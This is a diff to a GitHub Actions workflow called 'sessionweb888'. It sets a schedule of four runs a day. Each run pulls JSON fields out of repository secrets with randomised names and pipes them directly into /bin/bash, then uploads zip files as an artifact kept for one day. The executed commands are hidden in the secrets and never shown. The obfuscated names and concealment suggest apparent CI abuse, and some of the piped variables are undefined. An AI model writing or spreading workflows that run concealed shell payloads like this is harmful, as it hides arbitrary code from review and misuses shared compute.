@@ -1,24 +1,25 @@
 name: sessionweb888
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '29 2/6 * * *'
 
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sessionweb888
         env:
-          del59786: ${{ secrets.del59786 }}
+          qppz5: ${{ secrets.qppz5 }}
         run: |
-          echo $del59786 | jq -r .keg023 | /bin/bash
-          echo $ehi93 | jq -r .vzs31 | /bin/bash
-          echo $jzy274 | jq -r .hzxux216 | /bin/bash
-          echo $ojm19489 | jq -r .opdcx7 | /bin/bash
-          echo $hmfhw1 | jq -r .rdff2 | /bin/bash
-          echo $x649 | jq -r .xg8 | /bin/bash
-          echo $cdld72425 | jq -r .u79102 | /bin/bash
+          printf '%s' "$qppz5" | jq -r .ixww519 | /bin/bash
+          printf '%s' "$deoke1598" | jq -r .rxdko8 | /bin/bash
+          printf '%s' "$ybfm934" | jq -r .hwop22 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: q7OsJ5Xm
+          path: "*.zip"
+          retention-days: 1
